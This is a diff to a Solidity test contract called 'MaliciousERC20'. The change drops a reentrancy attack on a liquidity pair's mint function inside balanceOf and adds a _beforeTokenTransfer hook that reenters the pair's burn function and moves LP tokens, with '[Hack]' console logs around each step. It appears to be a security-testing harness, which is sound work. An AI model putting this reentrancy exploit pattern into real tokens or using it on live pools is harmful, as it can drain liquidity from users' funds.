@@ -22,6 +22,7 @@ contract MaliciousERC20 is CustomERC20 {
 
     constructor() CustomERC20("Malicous Token", "MAL") {
         _attackOn["MINT"] = 0;
+        _attackOn["BURN"] = 0;
     }
 
     function setPair(address pair) external {
@@ -53,22 +54,33 @@ contract MaliciousERC20 is CustomERC20 {
         return true;
     }
 
-    function balanceOf(address account) public override returns (uint256) {
-        if (_attackOn["MINT"] == 1 && _attackCount < 3) {
+    function balanceOf(address account) public view override returns (uint256) {
+        return _balances[account];
+    }
+
+    function _beforeTokenTransfer(address from, address to, uint256)
+        internal
+        override
+    {
+        if (_attackOn["BURN"] == 1 && _attackCount < 4) {
             _attackCount++;
 
-            console.log("*--[Hack] Mint: attack call start");
-            console.log("|");
+            if (from == _pair && to == _recipient) {
+                console.log("*--[Hack] Burn: attack call start");
+                console.log("|");
 
-            IPair(_pair).mint(_recipient);
+                // uint256 balance = IERC20(_pair).balanceOf(_recipient);
+                
+                
+                IPair(_pair).burn(_recipient);
+                
+                IERC20(_pair).transferFrom(_recipient, _pair, 1000 * 10 ** 18);
 
-            console.log("|");
-            console.log("*--[Hack] Mint: attack call end");
-            console.log(" \\_____________________________");
-
-            return _balances[account];
-        } else {
-            return _balances[account];
+                console.log("|");
+                console.log("*--[Hack] Burn: attack call end");
+                console.log(" \\_____________________________");
+                console.log(" /");
+            }
         }
     }
 }
